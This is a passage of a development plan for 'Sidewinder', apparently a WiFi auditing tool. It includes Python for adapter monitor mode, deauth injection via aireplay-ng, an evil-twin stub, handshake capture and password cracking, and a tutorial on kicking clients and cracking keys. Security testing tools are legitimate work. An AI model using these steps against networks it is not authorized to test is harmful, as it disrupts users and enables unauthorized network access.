**Estimated time:** 1 day

---

### 2.3 RTL8821AU morrownr Detection

**What:** Detect RTL8821AU with morrownr driver (not rtw88).

**Detection logic:**
```python
def detect_rtl8821au_morrownr() -> bool:
    """Check if RTL8821AU has morrownr driver loaded"""
    # Check lsmod
    result = subprocess.run(["lsmod"], capture_output=True, text=True)
    if "8821au" in result.stdout:
        return True  # morrownr loaded

    # Check if rtw88 is loaded (bad)
    if "rtw88" in result.stdout:
        return False  # rtw88, no monitor mode

    return False  # No driver loaded
```

**Installation prompt:**
```python
RTL8821AU_INSTALL_STEPS = [
    "sudo apt install build-essential dkms git",
    "git clone https://github.com/morrownr/8821au-20210708.git",
    "cd 8821au-20210708 && sudo ./install-driver.sh",
    "Reboot",
]
```

**Verification:**
- [ ] Detects morrownr driver correctly
- [ ] Detects rtw88 driver (warns user)
- [ ] Shows installation steps if no driver
- [ ] Unit test: mock lsmod output

**Estimated time:** 0.5 days

---

### 2.4 RTL8821AU Monitor Mode (Radiotap)

**What:** Enter monitor mode on RTL8821AU with full radiotap support.

**Initialization:**
```python
async def init_rtl8821au_optimized(iface: str) -> bool:
    """RTL8821AU OPTIMIZED initialization"""
    # 1. Verify morrownr driver
    if not detect_rtl8821au_morrownr():
        raise AdapterError("WRONG_DRIVER")

    # 2. Bring down
    await run(["ip", "link", "set", iface, "down"])

    # 3. Set monitor mode (morrownr supports direct mode change)
    await run(["iw", "dev", iface, "set", "type", "monitor"])

    # 4. Set radiotap flags
    await run(["iw", "dev", iface, "set", "monitor", "fcsfail", "otherbss"])

    # 5. Bring up
    await run(["ip", "link", "set", iface, "up"])

    # 6. Set channel (default ch6)
    await run(["iw", "dev", iface, "set", "channel", "6"])

    return True
```

**Verification:**
- [ ] Monitor mode entered successfully
- [ ] Radiotap header present in captures
- [ ] Signal strength reported correctly (not zero)
- [ ] VHT fields present for 5GHz
- [ ] Unit test: mock iw calls

**Estimated time:** 0.5 days

---

### 2.5 RTL8821AU Injection Engine

**What:** Packet injection via radiotap-iterator-based TX path.

**Injection function:**
```python
async def inject_deauth(mon_iface: str, bssid: str, client: str, count: int = 10):
    """Inject deauth frames via RTL8821AU"""
    cmd = [
        "aireplay-ng", "--deauth", str(count),
        "-a", bssid,
        "-c", client,
        mon_iface,
    ]
    result = await run(cmd, timeout=30)
    return result.returncode == 0

async def inject_beacon(mon_iface: str, essid: str, channel: int):
    """Inject beacon frame for evil twin"""
    # Uses mdk4 or custom injection
    pass
```

**Verification:**
- [ ] Deauth frames sent successfully
- [ ] Frames received by target
- [ ] Injection works on both 2.4GHz and 5GHz
- [ ] Rate control works (radiotap RATE field)
- [ ] Unit test: mock aireplay-ng output

**Estimated time:** 1 day

---

### 2.6 MT7902 Detection + Protection

**What:** Detect MT7902, mark as INTERNET ONLY, protect from attack operations.

**Detection:**
```python
def detect_mt7902() -> bool:
    """Detect MT7902 built-in adapter"""
    result = subprocess.run(["lspci", "-nn"], capture_output=True, text=True)
    return "14c3:7902" in result.stdout.lower()
```

**Protection:**
```python
MT7902_RESTRICTIONS = {
    "monitor": False,      # RX-only, no injection
    "injection": False,    # No TX path
    "deauth": False,       # Cannot deauth
    "evil_twin": False,    # Cannot create AP
    "scan": True,          # Can scan in managed mode
    "internet": True,      # Primary purpose
}

def check_adapter_allowed(adapter: Adapter, operation: str) -> bool:
    """Check if adapter is allowed for operation"""
    if adapter.chipset == "MT7902" and not MT7902_RESTRICTIONS.get(operation, False):
        raise AdapterError(
            what=f"MT7902 cannot perform {operation}",
            why="Monitor mode is RX-only, no injection support",
            how_to_fix=["Use RT5370 or RTL8821AU for this operation"],
        )
    return True
```

**Verification:**
- [ ] MT7902 detected correctly
- [ ] Attack operations blocked with clear error
- [ ] Scan operation allowed
- [ ] Error message explains why and suggests alternatives
- [ ] Unit test: mock lspci output

**Estimated time:** 0.5 days

---

### 2.7 Multi-Adapter Manager

**What:** Manage multiple adapters simultaneously, assign roles.

**Manager class:**
```python
class AdapterManager:
    def __init__(self):
        self.adapters: dict[str, Adapter] = {}
        self.active_adapter: Optional[Adapter] = None

    async def discover(self):
        """Discover all adapters"""
        for iface in get_interfaces():
            adapter = detect_adapter(iface)
            if adapter:
                self.adapters[iface] = adapter

    def get_best_for_operation(self, operation: str) -> Optional[Adapter]:
        """Select best adapter for operation"""
        candidates = [
            a for a in self.adapters.values()
            if a.monitor_capable or a.injection_capable
        ]
        if not candidates:
            return None
        # Prefer RTL8821AU > RT5370 > MT7902
        return sorted(candidates, key=lambda a: ADAPTER_PRIORITY.get(a.chipset, 0))[0]

    def get_internet_adapter(self) -> Optional[Adapter]:
        """Get adapter for internet (MT7902 preferred)"""
        for a in self.adapters.values():
            if a.chipset == "MT7902":
                return a
        return None
```

**Verification:**
- [ ] All 3 adapters discovered
- [ ] Best adapter selected for each operation
- [ ] Internet adapter identified
- [ ] Handles adapter hotplug
- [ ] Unit test: mock adapter discovery

**Estimated time:** 1 day

---

### 2.8 Adapter-Specific Error Database

**What:** Error messages tailored to each adapter, not generic.

**Error database:**
```python
ADAPTER_ERRORS = {
    "RT5370": {
        "MONITOR_FAILED": {
            "what": "RT5370 failed to enter monitor mode",
            "why": "Driver may be busy or rfkill blocked",
            "how_to_fix": [
                "Check rfkill: rfkill list",
                "Unblock: rfkill unblock wifi",
                "Reload driver: sudo rmmod rt2870sta && sudo modprobe rt2870sta",
            ],
        },
        "INJECTION_SLOW": {
            "what": "RT5370 injection rate limited",
            "why": "USB bulk pipe limits throughput",
            "how_to_fix": [
                "Reduce deauth count",
                "Switch to RTL8821AU for faster injection",
            ],
        },
    },
    "RTL8821AU": {
        "WRONG_DRIVER": {
            "what": "RTL8821AU using rtw88 driver (no monitor mode)",
            "why": "Ubuntu default driver doesn't support monitor mode",
            "how_to_fix": [
                "Install morrownr driver:",
                "  git clone https://github.com/morrownr/8821au-20210708.git",
                "  cd 8821au-20210708 && sudo ./install-driver.sh",
                "  Reboot",
            ],
        },
        "USB_SURPRISE": {
            "what": "RTL8821AU disconnected during operation",
            "why": "USB connection unstable",
            "how_to_fix": [
                "Try different USB port",
                "Avoid USB hubs",
                "Check USB cable",
            ],
        },
    },
    "MT7902": {
        "NO_INJECTION": {
            "what": "MT7902 cannot perform packet injection",
            "why": "Driver has no TX path for monitor mode",
            "how_to_fix": [
                "Use RT5370 or RTL8821AU for injection",
                "MT7902 is for internet connectivity only",
            ],
        },
        "KERNEL_PANIC": {
            "what": "MT7902 caused kernel panic",
            "why": "Known issue on some ASUS boards",
            "how_to_fix": [
                "Blacklist module: echo 'blacklist mt7902' | sudo tee /etc/modprobe.d/blacklist-mt7902.conf",
                "Update BIOS",
                "Use USB adapter instead",
            ],
        },
    },
}
```

**Verification:**
- [ ] RT5370 errors are RT5370-specific
- [ ] RTL8821AU errors are RTL8821AU-specific
- [ ] MT7902 errors are MT7902-specific
- [ ] No generic "unknown adapter" messages
- [ ] Unit test: error lookup for each adapter

**Estimated time:** 1 day

---

### 2.9 Dual-Adapter Failover

**What:** If primary adapter fails, automatically switch to backup.

**Failover logic:**
```python
class FailoverManager:
    def __init__(self, adapter_manager: AdapterManager):
        self.am = adapter_manager
        self.primary: Optional[Adapter] = None
        self.backup: Optional[Adapter] = None

    def setup(self, operation: str):
        """Setup primary and backup adapters"""
        self.primary = self.am.get_best_for_operation(operation)
        remaining = [a for a in self.am.adapters.values() if a != self.primary]
        self.backup = remaining[0] if remaining else None

    async def execute_with_failover(self, func, *args, **kwargs):
        """Execute function with automatic failover"""
        try:
            return await func(self.primary, *args, **kwargs)
        except AdapterError:
            if self.backup:
                logger.warning(f"Primary adapter failed, switching to {self.backup.name}")
                return await func(self.backup, *args, **kwargs)
            raise
```

**Verification:**
- [ ] Primary adapter used first
- [ ] Backup adapter used on failure
- [ ] Failover is transparent to user
- [ ] No data loss during failover
- [ ] Unit test: simulate adapter failure

**Estimated time:** 1 day

---

### 2.10 Performance Tuning Per Card

**What:** Optimal settings for each adapter per operation.

**Settings matrix:**
```python
CARD_SETTINGS = {
    "RT5370": {
        "scan": {"mode": "managed", "power_save": "auto"},
        "capture": {"mode": "monitor", "psmode": "CAM", "htmcs": "0", "rate": "OFDM"},
        "deauth": {"mode": "monitor", "psmode": "CAM", "rate": "CCK", "count": 10},
        "inject": {"mode": "monitor", "psmode": "CAM", "rate": "OFDM", "mcs": "0"},
    },
    "RTL8821AU": {
        "scan": {"mode": "managed", "power_save": "auto"},
        "capture": {"mode": "monitor", "flags": "fcsfail otherbss", "band": "auto"},
        "deauth": {"mode": "monitor", "flags": "fcsfail otherbss", "count": 10},
        "inject": {"mode": "monitor", "flags": "fcsfail otherbss", "rate": "auto"},
        "evil_twin": {"mode": "monitor+AP", "channel": "target"},
    },
    "MT7902": {
        "scan": {"mode": "managed"},
        "capture": None,  # Not supported
        "deauth": None,    # Not supported
        "inject": None,    # Not supported
    },
}
```

**Verification:**
- [ ] RT5370 uses optimal settings
- [ ] RTL8821AU uses optimal settings
- [ ] MT7902 restricted to scan only
- [ ] Settings applied correctly
- [ ] Unit test: settings lookup for each card/operation

**Estimated time:** 1 day

---

### 2.11 Card-Specific Unit Tests

**What:** Comprehensive tests for each adapter's unique behavior.

**Test files:**
```
tests/
├── test_rt5370.py
│   ├── test_detect_rt5370
│   ├── test_iwpriv_commands
│   ├── test_monitor_mode
│   ├── test_prism2_header
│   └── test_injection
├── test_rtl8821au.py
│   ├── test_detect_rtl8821au
│   ├── test_morrownr_driver
│   ├── test_monitor_mode
│   ├── test_radiotap_header
│   └── test_injection
├── test_mt7902.py
│   ├── test_detect_mt7902
│   ├── test_protection
│   └── test_scan_only
└── test_adapter_manager.py
    ├── test_discovery
    ├── test_best_adapter
    ├── test_failover
    └── test_settings
```

**Verification:**
- [ ] All tests pass
- [ ] Coverage > 80% for adapter code
- [ ] No mocking of real hardware (mock sysfs/iw)
- [ ] Tests run in < 5 seconds

**Estimated time:** 1 day

---

### 2.12 Integration Tests

**What:** End-to-end tests for full attack pipelines.

**Test scenarios:**
```python
@pytest.mark.asyncio
async def test_full_pipeline_rt5370():
    """Full scan → capture → crack pipeline with RT5370"""
    adapter = MockRT5370()
    session = Session(adapter=adapter)

    # Phase 0: Detection
    assert adapter.detected

    # Phase 1: Monitor mode
    mon_iface = await adapter.enter_monitor()
    assert await get_interface_mode(mon_iface) == "monitor"

    # Phase 2: Scan
    networks = await scan(mon_iface, duration=10)
    assert len(networks) > 0

    # Phase 3: Target selection
    target = networks[0]
    await lock_channel(mon_iface, target.channel)

    # Phase 4: Capture
    cap_file = await capture_passive(mon_iface, target.bssid, target.channel, "/tmp/test")
    assert os.path.exists(cap_file)

    # Phase 5: Validate
    result = validate_handshake(cap_file)
    assert result.status in ["partial", "full"]

    # Phase 6: Cleanup
    await adapter.exit_monitor(mon_iface)
    assert await get_interface_mode(adapter.iface) == "managed"
```

**Verification:**
- [ ] Full pipeline works for RT5370
- [ ] Full pipeline works for RTL8821AU
- [ ] MT7902 correctly blocked from attack operations
- [ ] Failover works when primary adapter removed
- [ ] No resource leaks after test
- [ ] Tests run in < 30 seconds

**Estimated time:** 2 days

---

## Phase 3: UI (Industry Standard)

> **Goal:** Beautiful, responsive TUI that feels like a professional tool. opencode-style branding, extensive tooltips, full status bar, keyboard-driven navigation.

### 3.1 Textual TUI Framework Setup

**What:** Initialize Textual app (built on rich), define layout, color palette, screen management, keyboard input.

**Textual handles:**
- Keyboard input (j/k/Enter/Esc/Space///)
- Screen management (push/pop screens)
- Event loops (async integration)
- Widget composition (tables, progress bars, panels)

**App structure:**
```python
from textual.app import App, ComposeResult
from textual.widgets import Header, Footer, Static, DataTable
from textual.binding import Binding

class SidewinderApp(App):
    """Sidewinder WiFi Audit Tool"""

    CSS = """
    Screen { background: #1A1A2E }
    DataTable { height: 1fr }
    """

    BINDINGS = [
        Binding("j", "cursor_down", "Down", show=False),
        Binding("k", "cursor_up", "Up", show=False),
        Binding("enter", "select", "Select"),
        Binding("escape", "back", "Back"),
        Binding("slash", "command_palette", "Command"),
        Binding("question", "help", "Help"),
    ]

    def compose(self) -> ComposeResult:
        yield Header()
        yield DataTable(id="main-table")
        yield Footer()

    def action_command_palette(self):
        """Open slash command palette"""
        pass

    def action_help(self):
        """Open help/tutorial"""
        self.push_screen("help")
```

**Color palette (Textual CSS):**
```css
/* colors.tcss */
:root {
    --primary: #4CAF50;
    --secondary: #00BCD4;
    --accent: #9C27B0;
    --success: #00E676;
    --error: #F44336;
    --warning: #FF9800;
    --info: #2196F3;
    --muted: #9E9E9E;
}
```

**Verification:**
- [ ] App renders without errors
- [ ] Color palette applied
- [ ] Layout splits correctly
- [ ] Live refresh works
- [ ] No flickering

**Estimated time:** 1 day

---

### 3.2 ASCII Logo + Branding

**What:** ASCII art snake coiled around "SIDEWINDER" text.

**Logo:**
```python
LOGO = """
    ▗▄▄▄▖ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▖
    █    █ █ SIDEWINDER v0.1 — Native WiFi Audit Tool        █
    █▄▄▄▄█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
"""

# Unicode fallback
LOGO_ASCII = """
    +-----------------------------------------------------------+
    | SIDEWINDER v0.1 -- Native WiFi Audit Tool                 |
    +-----------------------------------------------------------+
"""
```

**Verification:**
- [ ] Logo renders correctly
- [ ] Unicode version works in supported terminals
- [ ] ASCII fallback works in unsupported terminals
- [ ] Logo is compact (3 lines max)

**Estimated time:** 0.5 days

---

### 3.3 Main Menu (opencode Style)

**What:** Main menu with numbered options, keyboard navigation, slash commands.

**Menu:**
```python
MAIN_MENU = [
    ("1", "Scan WiFi networks", "scan"),
    ("2", "Target a specific network", "target"),
    ("3", "Crack a captured handshake", "crack"),
    ("4", "View saved captures", "view"),
    ("5", "Hardware & settings", "settings"),
    ("6", "Cleanup", "cleanup"),
    ("7", "Help & tutorial", "help"),
    ("0", "Exit", "exit"),
]
```

**Verification:**
- [ ] Menu renders correctly
- [ ] Number keys work (1-7, 0)
- [ ] Slash commands work (/scan, /target, etc.)
- [ ] j/k navigation works
- [ ] Enter selects
- [ ] Esc goes back

**Estimated time:** 1 day

---

### 3.4 Scan Results Table

**What:** Full airodump-style table with signal bars, WPS, clients.

**Table columns:**
```python
SCAN_TABLE_COLUMNS = [
    "BSSID",
    "CH",
    "Signal",      # With bar indicator
    "Rate",
    "Privacy",
    "Cipher",
    "Auth",
    "ESSID",
    "WPS",
    "Clients",
]
```

**Signal visualization:**
```python
def signal_bar(signal: int) -> str:
    """Convert signal to visual bar"""
    if signal > -50:
        return "[green]██████████[/green]"
    elif signal > -60:
        return "[green]████████░░[/green]"
    elif signal > -70:
        return "[yellow]██████░░░░[/yellow]"
    elif signal > -80:
        return "[orange]████░░░░░░[/orange]"
    else:
        return "[red]██░░░░░░░░[/red]"
```

**Verification:**
- [ ] Table displays all networks
- [ ] Signal bars render correctly
- [ ] WPS column shows status
- [ ] Hidden SSIDs show [HIDDEN]
- [ ] Real-time updates work
- [ ] Navigation works (j/k/Enter)

**Estimated time:** 1 day

---

### 3.5 Capture Method Selection

**What:** Visual selection of capture method (passive/deauth) with tooltips. PMKID deferred to Phase 2.

**Selection screen:**
```python
CAPTURE_METHODS = [
    ("1", "Passive Capture", "Wait for handshake", "safe"),
    ("2", "Deauth + Capture", "Kick clients, recapture", "caution"),
]
# NOTE: PMKID capture deferred to Phase 2 (see §2.5 RTL8821AU injection)
```

**Tooltip display:**
```python
def show_tooltip(method: dict):
    """Show tooltip below selection"""
    tooltip = Panel(
        f"What: {method['description']}\n"
        f"When: {method['when']}\n"
        f"Risk: {method['risk']}\n"
        f"Requires: {method['requires']}",
        title=method['name'],
        border_style="blue",
    )
```

**Verification:**
- [ ] All 3 methods displayed
- [ ] Tooltips show on hover/select
- [ ] Risk levels displayed
- [ ] Requirements shown
- [ ] Selection works

**Estimated time:** 1 day

---

### 3.6 Live Capture Progress

**What:** Real-time capture stats (beacons, data, IVs, rate, EAPOL status).

**Progress display:**
```python
CAPTURE_PROGRESS = """
Target: {essid} ({bssid}) — Ch:{channel} — Method: {method}

┌─ Capture Stats ───────────────────────────────────────────┐
│ Beacons: {beacons}  │  Data: {data}  │  IVs: {ivs}           │
│ Rate: {rate}/s      │  Signal: {signal}dBm  │  Elapsed: {elapsed}  │
└──────────────────────────────────────────────────────────┘

┌─ EAPOL Handshake ─────────────────────────────────────────┐
│ M1: {m1}  M2: {m2}  M3: {m3}  M4: {m4}    [{status}]        │
│ {progress_bar}  {percent}%                       │
└──────────────────────────────────────────────────────────┘
"""
```

**Verification:**
- [ ] Stats update in real-time
- [ ] EAPOL M1-M4 status shows correctly
- [ ] Progress bar animates
- [ ] Elapsed time counts up
- [ ] Ctrl+C stops cleanly

**Estimated time:** 1 day

---

### 3.7 Deauth Target Selection

**What:** Checkbox selection of clients to deauth, with rate control.

**Selection screen:**
```python
DEAUTH_SELECTION = """
Target: {essid} ({bssid}) — Channel {channel}

Clients connected:

[[*]]  {mac1}  {vendor1}  ({signal1}dBm)  {packets1} pkts
[[*]]  {mac2}  {vendor2}  ({signal2}dBm)  {packets2} pkts
[[*]]  {mac3}  {vendor3}  ({signal3}dBm)  {packets3} pkts
[ ]  {mac4}  {vendor4}  ({signal4}dBm)  {packets4} pkts

──────────────────────────────────────────────────────────
Space: toggle  ↑↓: navigate  Enter: confirm  a: select all
Rate: [{rate} deauths/sec]  +/-: adjust
"""
```

**Verification:**
- [ ] Checkboxes toggle with Space
- [ ] All selected by default
- [ ] Rate adjustment works (+/-)
- [ ] Enter confirms selection
- [ ] "a" selects all

**Estimated time:** 1 day

---

### 3.8 Crack Progress Display

**What:** Real-time crack progress (keys tested, speed, ETA, current key).

**Progress display:**
```python
CRACK_PROGRESS = """
Wordlist: {wordlist} ({total_keys} keys)
Method: {method}

┌─ Progress ─────────────────────────────────────────────────┐
│ {progress_bar}  {percent}%                            │
│ Keys tested: {tested} / {total}                       │
│ Speed: {speed} keys/sec  │  ETA: {eta}                     │
│ Current: {current_key}                                     │
└──────────────────────────────────────────────────────────┘

Press Ctrl+C to stop cracking
"""
```

**Verification:**
- [ ] Progress bar animates
- [ ] Keys tested updates
- [ ] Speed calculated correctly
- [ ] ETA estimates reasonably
- [ ] Current key shown
- [ ] Ctrl+C stops cleanly

**Estimated time:** 1 day

---

### 3.9 Result Card (Password Found)

**What:** Styled result card showing SSID, BSSID, password, method, time.

**Result card:**
```python
RESULT_CARD = """
┌─ RESULT ──────────────────────────────────────────────────┐
│                                                            │
│  SSID:     {ssid}                                          │
│  BSSID:    {bssid}                                         │
│  Password: [green]{password}[/green]                       │
│  Method:   {method}                                        │
│  Time:     {time}                                          │
│  Keys:     {keys} tested                                  │
│                                                            │
└──────────────────────────────────────────────────────────┘

[1] Save to file  [2] Copy to clipboard  [3] Try another wordlist
[4] Attack another  [5] Cleanup  [6] Main menu
"""
```

**Verification:**
- [ ] Password highlighted in green
- [ ] All fields populated
- [ ] Save to file works
- [ ] Copy to clipboard works
- [ ] Navigation works

**Estimated time:** 0.5 days

---

### 3.10 Error Cards

**What:** Rich error cards with What/Why/HowToFix.

**Error card:**
```python
ERROR_CARD = """
╭─────────────────────────────────────────────────────────────╮
│ [red]ERROR[/red] — {title}                                   │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│ ┌─ What Happened ───────────────────────────────────────┐   │
│ │ {what}                                                │   │
│ └──────────────────────────────────────────────────────┘   │
│                                                             │
│ ┌─ Why ─────────────────────────────────────────────────┐   │
│ │ {why}                                                 │   │
│ └──────────────────────────────────────────────────────┘   │
│                                                             │
│ ┌─ How to Fix ──────────────────────────────────────────┐   │
│ │ {how_to_fix}                                          │   │
│ └──────────────────────────────────────────────────────┘   │
│                                                             │
│ Raw error: {raw_error}                                      │
│ Time: {timestamp}                                           │
│                                                             │
╰─────────────────────────────────────────────────────────────╯
"""
```

**Verification:**
- [ ] Error card renders correctly
- [ ] What/Why/HowToFix populated
- [ ] Raw error shown
- [ ] Timestamp shown
- [ ] Different severity levels (color-coded)

**Estimated time:** 0.5 days

---

### 3.11 Help/Tutorial System

**What:** Full WiFi audit tutorial on `?` press.

**Tutorial content:**
```python
TUTORIAL = """
Welcome to Sidewinder! This tutorial covers the basics.

Phase 1: Scan
─────────────
1. Press [1] to scan WiFi networks
2. Wait for results (auto-hops all channels)
3. Press Enter to stop when you see your target
4. Select target from the list

Phase 2: Capture
────────────────
1. Choose capture method (passive or deauth)
2. Select deauth targets if applicable
3. Wait for EAPOL handshake (M1-M4)
4. Press Ctrl+C when complete

Phase 3: Crack
──────────────
1. Select wordlist (auto-discovers common paths)
2. Choose tool (aircrack-ng or hashcat)
3. Wait for password

Phase 4: Cleanup
────────────────
1. Press [6] to restore normal mode
2. Confirm file deletion
3. Exit safely

Note: PMKID capture will be added in Phase 2 (card optimization).

Press Esc to return to main menu
"""
```

**Verification:**
- [ ] Tutorial opens on `?`
- [ ] Content is accurate
- [ ] Esc closes tutorial
- [ ] Tutorial is readable

**Estimated time:** 0.5 days

---

### 3.12 Slash Commands + Status Bar

**What:** Slash commands for quick actions, status bar with full info.

**Slash commands:**
```python
SLASH_COMMANDS = {
    "/scan": "Start scan",
    "/target": "Select target",
    "/capture": "Start capture",
    "/crack": "Start crack",
    "/cleanup": "Cleanup",
    "/help": "Open help",
    "/status": "Show status",
    "/adapter": "Switch adapter",
    "/quit": "Exit",
}
```

**Status bar:**
```python
STATUS_BAR = "{adapter} │ Ch:{channel} │ {mode} │ {signal}dBm │ {clients} clients │ {job} │ {elapsed}"
```

**Verification:**
- [ ] All slash commands work
- [ ] Status bar updates in real-time
- [ ] Adapter name shown
- [ ] Channel shown
- [ ] Mode shown (managed/monitor)
- [ ] Signal shown
- [ ] Client count shown
- [ ] Current job shown
- [ ] Elapsed time counts up

**Estimated time:** 1 day

---

## Summary

| Phase | Subphases | Total Days | Status |
|-------|-----------|------------|--------|
| **Phase 1: Core** | 12 | ~14 days | Pending |
| **Phase 2: Card Optimization** | 12 | ~12 days | Pending |
| **Phase 3: UI** | 12 | ~10 days | Pending |
| **Total** | **36** | **~36 days** | **Pending** |

---

## Dependencies Between Phases

```
Phase 1.1 (Project Structure)
    ↓
Phase 1.2 (Adapter Detection)
    ↓
Phase 1.3 (Subprocess Manager)
    ↓
Phase 1.4 (Monitor Mode) ← Phase 1.2
    ↓
Phase 1.5 (Service Management)
    ↓
Phase 1.6 (Scan Engine) ← Phase 1.3, 1.4
    ↓
Phase 1.7 (Target Selection) ← Phase 1.6
    ↓
Phase 1.8 (Capture Engine) ← Phase 1.4, 1.6
    ↓
Phase 1.9 (EAPOL Validation) ← Phase 1.8
    ↓
Phase 1.10 (Crack Engine) ← Phase 1.9
    ↓
Phase 1.11 (Cleanup) ← Phase 1.4, 1.5
    ↓
Phase 1.12 (Error + Session) ← Phase 1.1-1.11
    ↓
Phase 2.1 (Adapter Abstraction) ← Phase 1.2
    ↓
Phase 2.2-2.6 (Card Implementations) ← Phase 2.1
    ↓
Phase 2.7-2.12 (Manager + Tests) ← Phase 2.2-2.6
    ↓
Phase 3.1 (Rich Setup) ← Phase 1.1
    ↓
Phase 3.2-3.12 (UI Components) ← Phase 3.1, Phase 1.x
```

---

## Verification Checklist

After each phase, verify:

- [ ] All unit tests pass (`pytest`)
- [ ] No lint errors (`ruff check`)
- [ ] No type errors (`pyright`)
- [ ] Memory stable (no leaks after 10-minute run)
- [ ] No zombie processes
- [ ] Manual testing passes (boot into Ubuntu, run Sidewinder)
- [ ] All 3 adapters handled correctly
- [ ] Error messages are clear and actionable
